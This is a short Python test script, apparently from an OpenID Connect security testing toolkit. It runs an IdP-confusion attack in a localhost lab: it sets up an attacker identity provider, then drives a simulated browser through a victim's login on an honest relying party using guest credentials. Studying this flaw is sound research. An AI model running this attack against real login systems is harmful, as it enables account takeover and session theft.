import sys
import os
import time
import jwt

from osbtlib import BrowserSimulator, Osbtlib

# set endpoints
ATTACKER_OP_ENDPOINT = "http://localhost:9997"
HONEST_RP_ENDPOINT = "http://localhost:9999"
HONEST_OP_ENDPOINT = "http://localhost:3001"
PROXY_SERVER_ENDPOINT = "http://localhost:8080"
PROXY_EXTENSION_ENDPOINT = "http://localhost:5555"

# victim credentials
victim_username = 'guest'
victim_password = 'guest'

# create instance of osbtlib
osbt = Osbtlib(
    proxy_extension_url = PROXY_EXTENSION_ENDPOINT
)

try:
    # send order to attacker op
    res = osbt.attacker_op.idp_confusion(f'{HONEST_OP_ENDPOINT}/authorize')
    print("request sent:", res)

    time.sleep(5)

    # define browser operations
    print(f'{HONEST_RP_ENDPOINT}/login?issuer={ATTACKER_OP_ENDPOINT}')
    bs = BrowserSimulator(f'{HONEST_RP_ENDPOINT}/login?issuer={ATTACKER_OP_ENDPOINT}', PROXY_SERVER_ENDPOINT)
    sso_flow = f"""
page.locator('input[name="userId"]').fill('{victim_username}')
page.locator('input[name="password"]').fill('{victim_password}')
page.locator('input[type="submit"]').click()
page.locator('input[type="submit"][value="Yes"]').click()
    """
    # run browser operations
    bs.run(sso_flow)
    content = bs.get_content()
    print(content) # AxiosError: Request failed with status code 400 で成功, 理想としてはAttacker IdPのログを参照したい

    osbt.attacker_op.clean()
    bs.close()

except Exception as e:
    print('Error:', e)
    osbt.attacker_op.clean()